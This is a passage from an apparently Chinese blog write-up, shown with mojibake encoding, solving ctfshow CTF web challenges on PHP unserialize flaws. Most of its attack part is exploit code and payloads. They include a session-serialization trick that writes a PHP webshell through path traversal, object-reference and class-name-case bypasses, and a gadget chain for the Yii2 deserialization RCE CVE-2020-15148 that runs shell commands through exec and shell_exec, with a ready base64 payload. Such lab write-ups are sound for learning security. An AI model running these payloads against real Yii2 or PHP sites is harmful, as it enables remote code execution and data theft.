class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;spoock&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>php å¼•æ“ä¸‹æ–‡ä»¶å†…å®¹ä¸º:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name|s:<span class="number">6</span>:<span class="string">&quot;spoock&quot;</span>;</span><br></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;admin/../../../../../../../../../../var/www/html/1.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&quot;&lt;?php system(&#x27;cat flag.php&#x27;);?&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$c</span> =  <span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$c</span>));</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¯´ä¸€ä¸‹æ“ä½œæ­¥éª¤ã€‚</p><ol><li>å…ˆè®¿é—®é¡µé¢ï¼Œè·å–åˆ°cookieå’Œsessionã€‚</li><li>è¿è¡Œexpï¼Œå°†ååºåˆ—åŒ–å­—ç¬¦æ”¾å…¥cookieä¸­limit</li><li>è®¿é—®check.php</li><li>è®¿é—®1.php<h1 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>å’Œä¸Šä¸€ä¸ªé€ƒé€¸å·®åˆ«æ˜¯åœ¨è®¿é—®message.phpæ—¶éœ€è¦åœ¨cookieä¸­æ·»åŠ msgçš„å‚æ•°ä½œä¸ºsessionï¼Œå€¼å¹¶æ²¡æœ‰è¦æ±‚ã€‚<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=<span class="number">1</span>&amp;m=<span class="number">2</span>&amp;t=<span class="number">3</span>fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>ç„¶åå†message.phpä¼ å…¥ä¸€ä¸ªcookieå€¼ä¸ºmsg=1<br>ä»¥ä¸Šæ˜¯wpä¸­æ‰€è¯´çš„æ­¥éª¤ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘æ— è®ºå¦‚ä½•æ‰§è¡Œéƒ½æ˜¯<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690625827239-a0c8c2ad-a4e6-4578-a9d1-21a26204f743.png" alt="image.png"><br>å³ä½¿é‡æ–°å†™payloadä¹Ÿæ˜¯ç›¸åŒç»“æœã€‚<br>æœ€åä¿®æ”¹å¥½äº†ï¼Œæ˜¯å› ä¸ºæˆ‘å¼€äº†ä¸¤ä¸ªé¡µé¢ï¼Œç¬¬ä¸€ä¸ªé¡µé¢ä¼ å‡ºçš„sessionæˆ‘æ²¡æœ‰äº¤ç»™ç¬¬äºŒä¸ªé¡µé¢<code>message.php</code>å¯¼è‡´ä¸èƒ½å¾—åˆ°å›æ˜¾ï¼Œä½¿ç”¨ä¸€ä¸ªé¡µé¢ä¿®æ”¹å°±å¥½äº†ã€‚<h1 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h1><h3 id="ååºåˆ—åŒ–æŒ‡é’ˆå¼•ç”¨-amp"><a href="#ååºåˆ—åŒ–æŒ‡é’ˆå¼•ç”¨-amp" class="headerlink" title="ååºåˆ—åŒ–æŒ‡é’ˆå¼•ç”¨&amp;"></a>ååºåˆ—åŒ–æŒ‡é’ˆå¼•ç”¨&amp;</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());<span class="comment">//ç”Ÿæˆéšæœºæ•°</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¼•ç”¨ä¼ å€¼"><a href="#å¼•ç”¨ä¼ å€¼" class="headerlink" title="å¼•ç”¨ä¼ å€¼"></a>å¼•ç”¨ä¼ å€¼</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">abc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">abc</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;a =&amp;<span class="variable">$c</span>-&gt;b;</span><br><span class="line"><span class="variable">$c</span>-&gt;a = <span class="string">&#x27;1&#x27;</span>;<span class="comment">//æ­¤æ—¶å“ªæ€•ä¿®æ”¹açš„å€¼ä¹Ÿä¸ç®¡ç”¨</span></span><br><span class="line"><span class="variable">$c</span>-&gt;b = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$c</span>-&gt;a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿è¡Œç»“æœ</span></span><br><span class="line">cc459dba9ce1830f72c80ba14532bbac</span><br></pre></td></tr></table></figure>expï¼š<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshowAdmin</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;password=&amp;<span class="variable">$a</span>-&gt;token;<span class="comment">//è®©passwdçš„å€¼éštokenå˜</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿è¡Œç»“æœ</span></span><br><span class="line">O:<span class="number">12</span>:<span class="string">&quot;ctfshowAdmin&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;i:<span class="number">1</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;R:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure><h1 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h1><h3 id="phpå¯¹ç±»åå¤§å°å†™ä¸æ•æ„Ÿ"><a href="#phpå¯¹ç±»åå¤§å°å†™ä¸æ•æ„Ÿ" class="headerlink" title="phpå¯¹ç±»åå¤§å°å†™ä¸æ•æ„Ÿ"></a>phpå¯¹ç±»åå¤§å°å†™ä¸æ•æ„Ÿ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>å‡ºç°ctfshowå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œå°±ä¸èƒ½è§¦å‘__destructæ–¹æ³•ï¼Œå› æ­¤ä½¿ç”¨å¤§å†™å°±è¡Œã€‚</li></ol><ul><li>åŒºåˆ†å¤§å°å†™çš„ï¼š å˜é‡åã€å¸¸é‡åã€æ•°ç»„ç´¢å¼•ï¼ˆé”®åkeyï¼‰</li><li>ä¸åŒºåˆ†å¤§å°å†™çš„ï¼šå‡½æ•°åã€æ–¹æ³•åã€ç±»åã€é­”æœ¯å¸¸é‡ã€NULLã€FALSEã€TRUE</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ctfshow</span></span>&#123;&#125;;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Ctfshow</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:7:&quot;Ctfshow&quot;:0:&#123;&#125;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„çš„ä½¿ç”¨æ–¹æ³•æŒºç¥å¥‡ï¼š<br>åœ¨hackbarä¸çŸ¥é“ä¸ºä»€ä¹ˆä¼ ä¸è¿›å»postè¯·æ±‚ä½“ï¼Œç”¨bpæŠ“åŒ…å°±è¡Œäº†ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690624961632-8d70a56c-bd65-4a35-87d1-0bb968ead848.png" alt="image.png"></p><h1 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h1><h3 id="CVE-2020-15148-Yii2ååºåˆ—åŒ–æ¼æ´"><a href="#CVE-2020-15148-Yii2ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="CVE-2020-15148 Yii2ååºåˆ—åŒ–æ¼æ´"></a>CVE-2020-15148 Yii2ååºåˆ—åŒ–æ¼æ´</h3><p>åé¢ä¸€å †æ“ä½œæœ‰ç‚¹æ²¡çœ‹æ‡‚ã€‚ä¸€æŸ¥å‘ç°æ˜¯ä¸€ä¸ªæ¼æ´ï¼š</p><blockquote><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/111259943">https://blog.csdn.net/xuandao_ahfengren/article/details/111259943</a></p></blockquote><p>admin adminå¼±å£ä»¤å¯†ç ç™»å½•ï¼Œåœ¨abouté¡µé¢æŸ¥çœ‹æºä»£ç ä¼šå‘ç°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?view-source --&gt;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œæˆ‘ä¸€ç‚¹å‡»aboutå°±ä¼šé€€å‡ºadminçŠ¶æ€ã€‚å¯èƒ½æ˜¯æŸä¸ªåœ°æ–¹å‡ºäº†é—®é¢˜ï¼Œä¸é‡è¦ã€‚<br>è®¿é—®ï¼š<code>/index.php?r=site%2Fabout&amp;view-source</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690626931485-6d460a9f-e967-42e5-9521-993e2781c164.png" alt="image.png"><br>æç¤ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///backdoor/shell</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨ç½‘ä¸Šçš„pocï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">IndexAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;exec&#x27;</span>;<span class="comment">//PHPå‡½æ•°</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;cat /flag &gt;2.txt&#x27;</span>;    <span class="comment">//PHPå‡½æ•°çš„å‚æ•°  </span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">IndexAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">IndexAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader=<span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">BatchQueryResult</span>()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo0OiJleGVjIjtzOjI6ImlkIjtzOjE2OiJjYXQgL2ZsYWcgPjIudHh0Ijt9aToxO3M6MzoicnVuIjt9fX19</span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®æ ¹ç›®å½•ä¸‹çš„2.txtå³å¯</p><h1 id="web268-269"><a href="#web268-269" class="headerlink" title="web268-269"></a>web268-269</h1><h3 id="CVE-2020-15148-Yii2ååºåˆ—åŒ–æ¼æ´-1"><a href="#CVE-2020-15148-Yii2ååºåˆ—åŒ–æ¼æ´-1" class="headerlink" title="CVE-2020-15148 Yii2ååºåˆ—åŒ–æ¼æ´"></a>CVE-2020-15148 Yii2ååºåˆ—åŒ–æ¼æ´</h3><p>ç±»ä¼¼ä½†æ˜¯éœ€è¦æ”¹æ”¹pocï¼Œå› ä¸ºæœ‰è¿‡æ»¤ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">web</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\<span class="title function_ invoke__">IndexAction</span>(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">base</span>\<span class="title class_">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\<span class="title function_ invoke__">DbSession</span>(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">exp</span> = <span class="title class_">new</span> \<span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>(&#x27;<span class="title class_">shell_exec</span>&#x27;, &#x27;<span class="title class_">cp</span> /<span class="title class_">f</span>* 1.<span class="title class_">txt</span>&#x27;); <span class="comment">//æ­¤å¤„å†™å‘½ä»¤</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ 